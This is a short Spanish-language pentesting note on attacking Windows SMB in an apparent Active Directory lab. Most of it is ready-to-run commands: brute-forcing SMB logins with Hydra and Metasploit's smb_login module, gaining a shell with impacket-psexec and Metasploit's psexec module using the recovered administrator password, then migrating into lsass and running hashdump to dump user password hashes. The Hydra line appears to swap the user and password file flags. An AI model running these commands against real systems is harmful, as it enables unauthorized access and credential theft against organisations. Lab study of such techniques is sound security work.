#ActiveDirectory 

Podemos también hacer ataques de fuerza bruta con Hydra al protocolo SMB:
```bash
hydra -P user.txt -L passwords.txt smb://192.168.0.30
```
En caso de obtener un error haciendo ataques de fuerza bruta al protocolo smb, podemos usar metasploit:
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.0.30
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
```

![[Pasted image 20240615210050.png]]

Una vez encontrado el usuario administrador, podemos loguearnos con la herramienta de psexec siempre y cuando algún recurso compartido tenga permisos de escritura:

```python
impacket-psexec administrator@192.168.0.20
```

Si tiene permisos de escritura:
![[Pasted image 20240615210110.png]]

Si no tiene permisos de escritura:
![[Pasted image 20240615210126.png]]

No obstante, si queremos entrar con metasploit para obtener una sesión de meterpreter, tendríamos que usar el siguiente módulo:

```python
use exploit/windows/smb/psexec
```

Y establecemos los parámetros:

```python
set RHOST 192.168.0.20
set RPORT 445
set SMBUSER administrator
set SMBPASS password1
```

Y habremos obtenido lo mismo de antes pero con metasploit una sesión de meterpreter:
![[Pasted image 20240615210158.png]]

Ahora podremos incluso dumpear los passwords de los usuarios, por lo que tenemos primero que mirar al proceso lsass para hacer esto:

```python
pgrep lsass # Proceso para realizar acciones privilegiadas
migrate 464
hashdump
```

![[Pasted image 20240615210222.png]]

También podemos conocer los usuarios si entramos con la shell y usamos el comando net users, donde vemos que en este caso hay tres usuarios dentro del SMB:

![[Pasted image 20240615210229.png]]